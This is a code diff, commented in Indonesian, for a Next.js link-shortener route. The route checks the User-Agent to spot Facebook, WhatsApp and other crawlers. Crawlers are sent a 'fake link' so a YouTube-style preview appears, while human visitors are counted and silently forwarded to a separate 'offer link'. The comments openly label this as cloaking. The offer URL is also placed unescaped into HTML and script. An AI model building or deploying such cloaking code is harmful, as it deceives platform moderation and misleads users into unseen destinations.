@@ -9,13 +9,13 @@ export async function GET(request, { params }) {
     const resolvedParams = await params;
     const shortcode = resolvedParams.shortcode;
 
-    // 1. Baca identitas (User-Agent)
+    // 1. Baca identitas
     const userAgent = request.headers.get('user-agent') || '';
 
-    // 2. Deteksi Bot Sosial Media (Murni untuk Scraper)
+    // 2. Deteksi Bot Sosial Media
     const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);
 
-    // 3. Cari data link di database
+    // 3. Cari data link
     const result = await turso.execute({
       sql: "SELECT * FROM links WHERE short_code = ?",
       args: [shortcode]
@@ -28,33 +28,22 @@ export async function GET(request, { params }) {
     const data = result.rows[0];
 
     // ==========================================
-    // SENJATA ANTI-CACHE: Angka Acak (Cache Buster)
+    // LOGIKA CLOAKING (BOT VS MANUSIA)
     // ==========================================
-    const randomNum = Math.floor(Math.random() * 10000000);
-
-    // Header untuk memaksa browser tidak menyimpan riwayat
-    const noCacheHeaders = {
-      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
-      'Pragma': 'no-cache',
-    };
 
     if (isBot) {
-      // JIKA BOT FB -> Lempar ke Fake Link
+      // BOT FB -> Lempar pake jalur belakang (Server Redirect 302)
+      // Bot FB butuh ini biar thumbnail & judul Youtube kebaca sempurna
       let fakeUrl = data.fake_link || 'google.com'; 
       if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
       
-      // Sisipkan angka acak di ujung URL
-      const separator = fakeUrl.includes('?') ? '&' : '?';
-      fakeUrl = `${fakeUrl}${separator}cb=${randomNum}`;
-
-      // Gunakan status 307 agar FB dilarang keras menyimpan URL ini
       return NextResponse.redirect(new URL(fakeUrl), { 
-        status: 307, 
-        headers: noCacheHeaders 
+        status: 302, 
+        headers: { 'Cache-Control': 'no-store' } 
       });
       
     } else {
-      // JIKA MANUSIA ASLI -> Lempar ke Offer Link
+      // MANUSIA (FB Biru, FB Lite, dll) -> Hitung Klik
       await turso.execute({
         sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
         args: [shortcode]
@@ -63,14 +52,29 @@ export async function GET(request, { params }) {
       let offerUrl = data.offer_link || 'google.com';
       if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
       
-      // Sisipkan angka acak di ujung URL
-      const separator = offerUrl.includes('?') ? '&' : '?';
-      offerUrl = `${offerUrl}${separator}cb=${randomNum}`;
+      // JURUS ANTI BLACK-SCREEN FB BIRU: JS REDIRECT
+      // Kita gak pake NextResponse.redirect(). Kita kasih halaman HTML super ringan
+      // yang otomatis pindah sendiri dalam 0.001 detik.
+      const html = `
+        <!DOCTYPE html>
+        <html>
+          <head>
+            <meta charset="utf-8">
+            <meta http-equiv="refresh" content="0;url=${offerUrl}">
+            <script>
+              window.location.replace("${offerUrl}");
+            </script>
+          </head>
+          <body style="background-color: #ffffff;"></body>
+        </html>
+      `;
 
-      // Gunakan status 307
-      return NextResponse.redirect(new URL(offerUrl), { 
-        status: 307, 
-        headers: noCacheHeaders 
+      return new NextResponse(html, {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/html',
+          'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
+        },
       });
     }
 
